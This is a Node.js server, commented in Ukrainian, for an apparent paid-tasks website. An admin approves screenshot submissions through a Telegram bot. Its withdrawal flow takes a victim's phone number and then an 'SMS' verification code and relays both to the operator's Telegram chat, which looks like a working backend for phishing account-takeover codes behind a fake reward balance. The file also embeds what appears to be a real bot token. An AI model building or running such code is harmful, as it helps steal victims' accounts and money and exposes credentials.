// ===============================================
// НЕОБХІДНІ НАЛАШТУВАННЯ
// ===============================================

// 1. Вставте сюди токен вашого Telegram-бота (отримати у @BotFather)
const TELEGRAM_BOT_TOKEN = '8535014130:AAGHrjXxPweBreFDlt2oJkd596aLTKwRSeE';

// 2. Вставте сюди ваш числовий Chat ID (отримати у @userinfobot)
const ADMIN_CHAT_ID = '-5095349969';

// ===============================================

const express = require('express');
const http = require('http');
const path = require('path');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');

// Ініціалізація
const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Збільшуємо ліміт payload для socket.io (для передачі base64 зображень)
io.engine.maxHttpBufferSize = 5e8; // 500 MB для больших скринов

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

// Обслуговуємо головну сторінку
app.get('/', (req, res) => {
    // Вказуємо правильний шлях до вашого HTML файлу
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Логіка Socket.IO (зв'язок з користувачем на сайті)
io.on('connection', (socket) => {
    console.log(`Користувач під'єднався: ${socket.id}`);

    // Коли користувач надсилає завдання на перевірку
    socket.on('submitTask', (data) => {
        console.log(`Отримано завдання від ${socket.id}:`, data.title);
        
        try {
            // == ОБРОБКА СКРІНШОТА ==
            // 1. Отримуємо base64 рядок (data:image/png;base64,iVBORw...)
            // 2. Видаляємо префікс, щоб отримати чисті base64 дані
            const base64Data = data.file.replace(/^data:image\/\w+;base64,/, "");
            // 3. Конвертуємо в Buffer
            const imageBuffer = Buffer.from(base64Data, 'base64');

            if (imageBuffer.length === 0) {
                throw new Error('Пустий буфер зображення - скріншот пошкоджений');
            }
            
            // Формуємо підпис для фото
            const caption = `🔔 Нове завдання на перевірку!\n\n` +
                                `📝 Завдання: ${data.title}\n` +
                                `💰 Винагорода: ${data.reward} грн\n` +
                                `👤 Користувач (Socket ID): ${socket.id}`;
            
            // Надсилаємо фото адміну
            bot.sendPhoto(ADMIN_CHAT_ID, imageBuffer, { caption: caption })
                .then(() => {
                    // == ПІСЛЯ ВІДПРАВКИ ФОТО, надсилаємо кнопки ==
                    
                    const messageText = `Підтвердіть або відхиліть виконання для ${socket.id}:`;
                    
                    // Створюємо унікальні callback-дані
                    const callbackDataConfirm = `confirm_${socket.id}_${data.reward}`;
                    const callbackDataCancel = `cancel_${socket.id}`;

                    // Створюємо кнопки
                    const options = {
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: '✅ Підтвердити', callback_data: callbackDataConfirm },
                                    { text: '❌ Відхилити', callback_data: callbackDataCancel }
                                ]
                            ]
                        }
                    };
                    
                    // Надсилаємо окреме повідомлення з кнопками
                    bot.sendMessage(ADMIN_CHAT_ID, messageText, options);

                })
                .catch(err => {
                    console.error('Помилка відправки фото в Telegram:', err);
                    bot.sendMessage(ADMIN_CHAT_ID, `Не вдалося завантажити скріншот від ${socket.id}. Помилка: ${err.message}`);
                    // Все одно надсилаємо кнопки, але з приміткою
                    const messageText = `⚠️ СКРІНШОТ НЕ ЗАВАНТАЖЕНО! Підтвердіть або відхиліть для ${socket.id}: (можливо, перевірте вручну)`;
                    
                    const callbackDataConfirm = `confirm_${socket.id}_${data.reward}`;
                    const callbackDataCancel = `cancel_${socket.id}`;

                    const options = {
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: '✅ Підтвердити', callback_data: callbackDataConfirm },
                                    { text: '❌ Відхилити', callback_data: callbackDataCancel }
                                ]
                            ]
                        }
                    };
                    
                    bot.sendMessage(ADMIN_CHAT_ID, messageText, options);
                });

        } catch (error) {
            console.error('Помилка обробки завдання:', error);
            // Повідомити адміна про проблему
            bot.sendMessage(ADMIN_CHAT_ID, `Сталася помилка при отриманні завдання від ${socket.id}: ${error.message}`);
            // Надіслати кнопки навіть при помилці
            const messageText = `⚠️ ПОМИЛКА ОБРОБКИ СКРІНШОТУ! Підтвердіть або відхиліть для ${socket.id}:`;
            
            const callbackDataConfirm = `confirm_${socket.id}_${data.reward}`;
            const callbackDataCancel = `cancel_${socket.id}`;

            const options = {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '✅ Підтвердити', callback_data: callbackDataConfirm },
                            { text: '❌ Відхилити', callback_data: callbackDataCancel }
                        ]
                    ]
                }
            };
            
            bot.sendMessage(ADMIN_CHAT_ID, messageText, options);
        }
    });
    
    // == ОБРОБКА ЗАПИТІВ НА ВИВЕДЕННЯ ==
    
    // Крок 1: Отримання номеру телефону
    socket.on('withdrawRequest', (data) => {
        console.log(`Запит на вивід від ${socket.id}:`, data);
        const message = `🔔 Запит на виведення!\n\n` +
                        `👤 Користувач: ${socket.id}\n` +
                        `📱 Телефон: ${data.phone}\n` +
                        `💰 Сума: ${data.balance.toFixed(2)} грн`;
        
        bot.sendMessage(ADMIN_CHAT_ID, message);
    });
    
    // Крок 2: Отримання "SMS" коду
    socket.on('withdrawCode', (data) => {
        console.log(`Код підтвердження від ${socket.id}:`, data);
        const message = `🔔 Користувач ${socket.id} ввів "SMS" код:\n\n` +
                        `🔒 Код: ${data.code}`;
        
        bot.sendMessage(ADMIN_CHAT_ID, message);
    });

    socket.on('disconnect', () => {
        console.log(`Користувач від'єднався: ${socket.id}`);
    });
});

// Логіка Telegram-бота (обробка натискань кнопок)
bot.on('callback_query', (query) => {
    const messageId = query.message.message_id;
    const chatId = query.message.chat.id;
    const data = query.data; // Наші дані: e.g., 'confirm_SOCKETID_REWARD'

    // Розбиваємо дані
    const parts = data.split('_');
    const action = parts[0];
    const socketId = parts[1];

    // Знаходимо сокет користувача
    const userSocket = io.sockets.sockets.get(socketId);

    if (action === 'confirm') {
        const reward = parts[2];

        if (userSocket) {
            // Користувач онлайн - надсилаємо йому оновлення балансу
            userSocket.emit('balanceUpdate', reward);
            // Редагуємо повідомлення в Telegram
            bot.editMessageText(`✅ ЗАВДАННЯ ПІДТВЕРДЖЕНО\n\nКористувачу ${socketId} нараховано ${reward} грн.`, {
                chat_id: chatId,
                message_id: messageId,
                reply_markup: null // Видаляємо кнопки
            });
        } else {
            // Користувач офлайн
            bot.editMessageText(`⚠️ ЗАВДАННЯ ПІДТВЕРДЖЕНО (але користувач офлайн)\n\nКористувач ${socketId} не на сайті. Потрібна логіка БД для збереження.`, {
                chat_id: chatId,
                message_id: messageId,
                reply_markup: null
            });
        }

    } else if (action === 'cancel') {
        if (userSocket) {
            // Користувач онлайн - надсилаємо відхилення
            userSocket.emit('taskRejected', 'Ваш скріншот не пройшов перевірку. Спробуйте ще раз.');
             // Редагуємо повідомлення в Telegram
            bot.editMessageText(`❌ ЗАВДАННЯ ВІДХИЛЕНО\n\nКористувачу ${socketId} надіслано сповіщення про відхилення.`, {
                chat_id: chatId,
                message_id: messageId,
                reply_markup: null // Видаляємо кнопки
            });
        } else {
            // Користувач офлайн
            bot.editMessageText(`❌ ЗАВДАННЯ ВІДХИЛЕНО (користувач офлайн)\n\nКористувач ${socketId} не на сайті.`, {
                chat_id: chatId,
                message_id: messageId,
                reply_markup: null
            });
        }
    }

    // Завершуємо "завантаження" на кнопці
    bot.answerCallbackQuery(query.id);
});

// Запускаємо сервер
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Сервер запущено на http://localhost:${PORT}`);
    console.log('Бот очікує на повідомлення...');
});
